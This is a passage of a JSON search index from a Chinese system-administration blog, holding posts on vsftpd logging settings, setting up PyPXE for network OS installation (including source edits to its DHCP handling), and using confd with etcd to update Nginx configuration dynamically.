class=\"na\"\u003etelnet\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e%end\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"三准备生成iso的脚本\"\u003e三、准备生成iso的脚本\u003c/h2\u003e\n\u003cp\u003e下载： \u003ca href=\"makeiso.sh\"\u003emakeiso.sh\u003c/a\u003e\u003c/p\u003e","title":"Centos auto install cdrom自动安装cdrom的制作"},{"content":"为了研发方便就给他们在内网开通了 vsftpd 的服务。\n结果 java 直接有封好的 ftp library 可用，大家就直接用了。\n导致任何单独的一个文件上传都会起一个 ftp 实例，没有复用 ftp 的 socket 链接 。系统挤压了大量的socket连接。\n烦恼啊，出了事就麻烦。需要把日志都详细记下来\n做法如下：\nvi /etc/vsftp/vsftpd.conf ...... dual_log_enable=YES log_ftp_protocol=YES xferlog_enable=YES xferlog_std_format=NO ...... 解释一下：\ndual_log_enable \u0026mdash; 和 xferlog_enable 协同，会写两份日志，一份到/var/log/xferlog，一份到/var/log/vsftpd.log\nlog_ftp_protocol \u0026mdash; 和 xferlog_enable 协同，同时xferlog_std_format需要设置为NO，这样所有的 FTP 命令都会记录下来。\n这样所有人的操作都会被记录下来，就后顾无忧了。\n","permalink":"https://rendoumi.com/posts/20211025-vsftpd/","summary":"\u003cp\u003e为了研发方便就给他们在内网开通了 vsftpd 的服务。\u003c/p\u003e\n\u003cp\u003e结果 java 直接有封好的 ftp library 可用，大家就直接用了。\u003c/p\u003e\n\u003cp\u003e导致任何单独的一个文件上传都会起一个 ftp 实例，没有复用 ftp 的 socket 链接 。系统挤压了大量的socket连接。\u003c/p\u003e\n\u003cp\u003e烦恼啊，出了事就麻烦。需要把日志都详细记下来\u003c/p\u003e\n\u003cp\u003e做法如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003evi /etc/vsftp/vsftpd.conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e......\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003edual_log_enable\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eYES\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elog_ftp_protocol\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eYES\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003exferlog_enable\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eYES\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003exferlog_std_format\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eNO\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e......\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e解释一下：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003edual_log_enable \u0026mdash; 和 xferlog_enable 协同，会写两份日志，一份到/var/log/xferlog，一份到/var/log/vsftpd.log\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003elog_ftp_protocol \u0026mdash; 和 xferlog_enable 协同，同时xferlog_std_format需要设置为NO，这样所有的 FTP 命令都会记录下来。\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e这样所有人的操作都会被记录下来，就后顾无忧了。\u003c/p\u003e","title":"vsftpd的日志设置"},{"content":"一般来说，我们要搭建一个正式的pxe自动装机系统，需要装 dnsmasq 做 dhcp + tftp ，需要编译 ipxe 来获得 undionly.kpxe ，需要 http 服务器来提供资源下载，repo 同步服务来提供 repo。组件非常多，也比较麻烦。\n当然，这么多也是有必要的，因为可以持续提供一个稳定的装机系统。\n场景一换，如果我们在本地机房里，什么都没有，想搭一套环境的步骤就比较繁复了。\nPyPXE 就是非常简单的一个程序，居然自己实现了用于 PXE 的 dhcp、tftp 和 http 全部的功能，而且支持 iPXE。\n太牛逼了，前提啊，PyPXE 是基于 Python 2.7 的，Python 3.x是运行不了的。\n想让它跑起来还必须做一定的修改，步骤如下：\n一、下载PyPXE git clone https://github.com/pypxe/PyPXE.git cd PyPXE 下载就行了，不用安装。\n二、手动生成config.json配置文件 { \u0026#34;DHCP_SERVER_IP\u0026#34;: \u0026#34;192.168.85.27\u0026#34;, \u0026#34;DHCP_FILESERVER\u0026#34;: \u0026#34;192.168.85.27\u0026#34;, \u0026#34;DHCP_OFFER_BEGIN\u0026#34;: \u0026#34;192.168.85.200\u0026#34;, \u0026#34;DHCP_OFFER_END\u0026#34;: \u0026#34;192.168.85.250\u0026#34;, \u0026#34;DHCP_SUBNET\u0026#34;: \u0026#34;255.255.255.0\u0026#34;, \u0026#34;DHCP_ROUTER\u0026#34;: \u0026#34;192.168.85.1\u0026#34;, \u0026#34;DHCP_DNS\u0026#34;: \u0026#34;114.114.114.114\u0026#34;, \u0026#34;DHCP_SERVER_PORT\u0026#34;: 67, \u0026#34;DHCP_BROADCAST\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;DHCP_MODE_PROXY\u0026#34;: false, \u0026#34;DHCP_WHITELIST\u0026#34;: false, \u0026#34;HTTP_PORT\u0026#34;: 80, \u0026#34;LEASES_FILE\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;MODE_DEBUG\u0026#34;: \u0026#34;dhcp\u0026#34;, \u0026#34;MODE_VERBOSE\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;NBD_BLOCK_DEVICE\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;NBD_COPY_TO_RAM\u0026#34;: false, \u0026#34;NBD_COW\u0026#34;: true, \u0026#34;NBD_COW_IN_MEM\u0026#34;: false, \u0026#34;NBD_PORT\u0026#34;: 10809, \u0026#34;NBD_SERVER_IP\u0026#34;: \u0026#34;0.0.0.0\u0026#34;, \u0026#34;NBD_WRITE\u0026#34;: false, \u0026#34;NETBOOT_DIR\u0026#34;: \u0026#34;netboot\u0026#34;, \u0026#34;NETBOOT_FILE\u0026#34;: \u0026#34;boot.http.ipxe\u0026#34;, \u0026#34;STATIC_CONFIG\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;SYSLOG_PORT\u0026#34;: 514, \u0026#34;SYSLOG_SERVER\u0026#34;: null, \u0026#34;USE_DHCP\u0026#34;: true, \u0026#34;USE_HTTP\u0026#34;: true, \u0026#34;USE_IPXE\u0026#34;: true, \u0026#34;USE_TFTP\u0026#34;: true } 上面json文件无法加注解，我们把它分三部分\n本机配置，本机的地址都是 192.168.85.27\ndhcp 的配置，开始192.168.85.200，结束192.68.85.250，掩码255.255.255.0，网关192.168.85.1，DNS114.114.114.114\n第三部分不用动\n三、下载ISO并修改ipxe脚本 cd netboot wget http://mirrors.163.com/rocky/8/isos/x86_64/Rocky-8.4-x86_64-dvd1.iso mkdir rocky8.iso mount -o loop Rocky-8.4-x86_64-dvd1.iso rocky8.iso cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; boot.http.ipxe #!ipxe :start menu PXE Boot Options item shell iPXE shell item Rocky8 Install rocky8 item exit Exit to BIOS choose --default rocky8 --timeout 5000 option \u0026amp;\u0026amp; goto ${option} :shell shell :rocky8 set root http://192.168.85.27/rocky8.iso initrd ${root}/images/pxeboot/initrd.img kernel ${root}/images/pxeboot/vmlinuz inst.repo=${root}/ initrd=initrd.img ip=dhcp boot :exit exit EOF 三、修改源代码 运行一下：\npython -m pypxe.server --config config.json --debug all --verbose all 如果我们起一台机器或者虚机，会报第一个错：\nUnicodeDecodeError: \u0026lsquo;ascii\u0026rsquo; codec can\u0026rsquo;t decode byte 0xc0 in position 0: ordinal not in range(128)\n这个是代码报错，我们需要修改一下\nvi pypxe/dhcp.py def tlv_encode(self, tag, value): \u0026#39;\u0026#39;\u0026#39;Encode a TLV option.\u0026#39;\u0026#39;\u0026#39; # 注释掉下面的两行，我们不需要打印出我们一定能看懂的字符，都按bytes处理即可 #if type(value) is str: # value = value.encode(\u0026#39;ascii\u0026#39;) value = bytes(value) return struct.pack(\u0026#39;BB\u0026#39;, tag, len(value)) + value 然后我们需要修改第二个地方，理由是这个 PyPXE 会判断 Client 发过来的 dhcp 请求，它只实现了针对PXE-Client的 Vendor-class：\n所以我们也要屏蔽一下，否则按照正常过程\n客户端dhcp \u0026ndash;\u0026gt; PyPXE 后，PyPXE 送回客户 ipxe 脚本，然后客户安装，当加载了vmlinuz和initrd之后会进入anaconda-linux进行系统安装，过程中会再次向DHCP服务器申请IP地址， 这个时候他向DHCP Server发出的discover申请是得不到回复的，因此安装过程将被打断。\nvi pypxe/dhcp.py def validate_req(self, client_mac): # client request is valid only if contains Vendor-Class = PXEClient \u0026#39;\u0026#39;\u0026#39;代码整个注释掉，直接返回 True if self.whitelist and self.get_mac(client_mac) not in self.get_namespaced_static(\u0026#39;dhcp.binding\u0026#39;): self.logger.info(\u0026#39;Non-whitelisted client request received from {0}\u0026#39;.format(self.get_mac(client_mac))) return False if 60 in self.options[client_mac] and \u0026#39;PXEClient\u0026#39;.encode() in self.options[client_mac][60][0]: self.logger.info(\u0026#39;PXE client request received from {0}\u0026#39;.format(self.get_mac(client_mac))) return True self.logger.info(\u0026#39;Non-PXE client request received from {0}\u0026#39;.format(self.get_mac(client_mac))) return False \u0026#39;\u0026#39;\u0026#39; return True 这样修改后，就可以正常安装了。\n服务器启动：\n客户端启动pxe开始安装，看下面，系统的ipxe dhcp一次，然后chainload.kpxe 又一次，anaconda 又一次，最少会发三次或更多的dhcp请求。\n用 VNC 连进去可以看到安装画面，如果是 kickstart 就是全自动安装了。\n","permalink":"https://rendoumi.com/posts/20211022-pypxe/","summary":"\u003cp\u003e一般来说，我们要搭建一个正式的pxe自动装机系统，需要装 dnsmasq 做 dhcp + tftp ，需要编译 ipxe 来获得 undionly.kpxe ，需要 http 服务器来提供资源下载，repo 同步服务来提供 repo。组件非常多，也比较麻烦。\u003c/p\u003e\n\u003cp\u003e当然，这么多也是有必要的，因为可以持续提供一个稳定的装机系统。\u003c/p\u003e\n\u003cp\u003e场景一换，如果我们在本地机房里，什么都没有，想搭一套环境的步骤就比较繁复了。\u003c/p\u003e\n\u003cp\u003ePyPXE 就是非常简单的一个程序，居然自己实现了用于 PXE 的 dhcp、tftp 和 http 全部的功能，而且支持 iPXE。\u003c/p\u003e\n\u003cp\u003e太牛逼了，前提啊，PyPXE 是基于 Python 2.7 的，Python 3.x是运行不了的。\u003c/p\u003e\n\u003cp\u003e想让它跑起来还必须做一定的修改，步骤如下：\u003c/p\u003e\n\u003ch2 id=\"一下载pypxe\"\u003e一、下载PyPXE\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit clone https://github.com/pypxe/PyPXE.git\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e PyPXE\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e下载就行了，不用安装。\u003c/p\u003e\n\u003ch2 id=\"二手动生成configjson配置文件\"\u003e二、手动生成config.json配置文件\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;DHCP_SERVER_IP\u0026#34;: \u0026#34;192.168.85.27\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;DHCP_FILESERVER\u0026#34;: \u0026#34;192.168.85.27\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;DHCP_OFFER_BEGIN\u0026#34;: \u0026#34;192.168.85.200\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;DHCP_OFFER_END\u0026#34;: \u0026#34;192.168.85.250\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;DHCP_SUBNET\u0026#34;: \u0026#34;255.255.255.0\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;DHCP_ROUTER\u0026#34;: \u0026#34;192.168.85.1\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;DHCP_DNS\u0026#34;: \u0026#34;114.114.114.114\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;DHCP_SERVER_PORT\u0026#34;: 67,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;DHCP_BROADCAST\u0026#34;: \u0026#34;\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;DHCP_MODE_PROXY\u0026#34;: false,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;DHCP_WHITELIST\u0026#34;: false,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;HTTP_PORT\u0026#34;: 80,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;LEASES_FILE\u0026#34;: \u0026#34;\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;MODE_DEBUG\u0026#34;: \u0026#34;dhcp\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;MODE_VERBOSE\u0026#34;: \u0026#34;\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;NBD_BLOCK_DEVICE\u0026#34;: \u0026#34;\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;NBD_COPY_TO_RAM\u0026#34;: false,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;NBD_COW\u0026#34;: true,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;NBD_COW_IN_MEM\u0026#34;: false,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;NBD_PORT\u0026#34;: 10809,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;NBD_SERVER_IP\u0026#34;: \u0026#34;0.0.0.0\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;NBD_WRITE\u0026#34;: false,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;NETBOOT_DIR\u0026#34;: \u0026#34;netboot\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;NETBOOT_FILE\u0026#34;: \u0026#34;boot.http.ipxe\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;STATIC_CONFIG\u0026#34;: \u0026#34;\u0026#34;,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;SYSLOG_PORT\u0026#34;: 514,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;SYSLOG_SERVER\u0026#34;: null,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;USE_DHCP\u0026#34;: true,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;USE_HTTP\u0026#34;: true,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;USE_IPXE\u0026#34;: true,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026#34;USE_TFTP\u0026#34;: true\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e上面json文件无法加注解，我们把它分三部分\u003c/p\u003e","title":"PyPXE-一个牛逼的一站式PXE安装包"},{"content":"上一篇文章我们介绍了 ETCD 的容器化，搞这件事情的主要目的其实是要动态更新 Nginx 的配置\n这一章我们就来配置 confd 和 Nginx，来达到动态更新 Nginx 配置的目的\n一、安装配置confd 下载并安装：\nwget https://github.com/kelseyhightower/confd/releases/download/v0.16.0/confd-0.16.0-linux-amd64 mv confd-0.16.0-linux-amd64 /usr/sbin/confd chmod +x /usr/sbin/confd 生成配置文件：\n我们在 etcd 中存放的格式如下\netcdctl set /nginx/app01/subdomain app1 etcdctl set /nginx/app01/upstream/app01_1 \u0026#34;192.168.0.1:5601\u0026#34; /nginx/app01/subdomain \u0026#34;app01\u0026#34; /nginx/app01/upstream/app01_1 \u0026#34;192.168.0.1:5601\u0026#34; /nginx/app01/upstream/app01_2 \u0026#34;192.168.0.2:5601\u0026#34; 那么，我们先生成 confd 的配置文件：\nmkdir -p /etc/confd/{conf.d,templates} cat \u0026lt;\u0026lt;EOF\u0026gt;\u0026gt;/etc/confd/conf.d/nginx.toml [template] src = \u0026#34;nginx.conf.tmpl\u0026#34; dest = \u0026#34;/etc/nginx/conf.d/nginx-auto.conf\u0026#34; keys = [ \u0026#34;/nginx/app01/subdomain\u0026#34;, \u0026#34;/nginx/app01/upstream\u0026#34;, ] check_cmd = \u0026#34;/usr/sbin/nginx -t\u0026#34; reload_cmd = \u0026#34;/usr/sbin/nginx -s reload\u0026#34; EOF cat \u0026lt;\u0026lt;EOT\u0026gt;\u0026gt;/etc/confd/templates/nginx.conf.tmpl upstream {{getv \u0026#34;/nginx/app01/subdomain\u0026#34;}} { {{range getvs \u0026#34;/nginx/app01/upstream/*\u0026#34;}} server {{.}}; {{end}} } server { server_name {{getv \u0026#34;/nginx/app01/subdomain\u0026#34;}}.example.com; location / { proxy_pass http://{{getv \u0026#34;/nginx/app01/subdomain\u0026#34;}}; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } } EOT confd 会根据 etcd 的值，结合 nginx.conf.tmpl ，生成 nginx-auto.conf，然后 nginx -t 验证通过后，执行 nginx -s rolad。\n注意：nginx的配置中必须有 include /etc/nginx/conf.d/*.conf;\n二、运行confd # 只处理一次 confd -onetime -backend etcd -node http://etcd-svc.default:2379 # 按时间轮询 confd -interval=60 -backend etcd -node http://etcd-svc.default:2379 \u0026amp; 这样就可以动态更新 Nginx 了。\n","permalink":"https://rendoumi.com/posts/20211021-etcd_confd_nginx/","summary":"\u003cp\u003e上一篇文章我们介绍了 ETCD 的容器化，搞这件事情的主要目的其实是要动态更新 Nginx 的配置\u003c/p\u003e\n\u003cp\u003e这一章我们就来配置 confd 和 Nginx，来达到动态更新 Nginx 配置的目的\u003c/p\u003e\n\u003ch2 id=\"一安装配置confd\"\u003e一、安装配置confd\u003c/h2\u003e\n\u003cp\u003e下载并安装：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://github.com/kelseyhightower/confd/releases/download/v0.16.0/confd-0.16.0-linux-amd64\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emv confd-0.16.0-linux-amd64 /usr/sbin/confd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod +x /usr/sbin/confd\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e生成配置文件：\u003c/p\u003e\n\u003cp\u003e我们在 etcd 中存放的格式如下\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eetcdctl set /nginx/app01/subdomain app1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eetcdctl set /nginx/app01/upstream/app01_1 \u0026#34;192.168.0.1:5601\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e/nginx/app01/subdomain \u0026#34;app01\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e/nginx/app01/upstream/app01_1 \u0026#34;192.168.0.1:5601\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e/nginx/app01/upstream/app01_2 \u0026#34;192.168.0.2:5601\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e那么，我们先生成 confd 的配置文件：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p /etc/confd/\u003cspan class=\"o\"\u003e{\u003c/span\u003econf.d,templates\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt;EOF\u0026gt;\u0026gt;/etc/confd/conf.d/nginx.toml\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e[template]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003esrc = \u0026#34;nginx.conf.tmpl\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003edest = \u0026#34;/etc/nginx/conf.d/nginx-auto.conf\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003ekeys = [\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  \u0026#34;/nginx/app01/subdomain\u0026#34;,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  \u0026#34;/nginx/app01/upstream\u0026#34;,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003echeck_cmd = \u0026#34;/usr/sbin/nginx -t\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003ereload_cmd = \u0026#34;/usr/sbin/nginx -s reload\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt;EOT\u0026gt;\u0026gt;/etc/confd/templates/nginx.conf.tmpl\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eupstream {{getv \u0026#34;/nginx/app01/subdomain\u0026#34;}} {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan 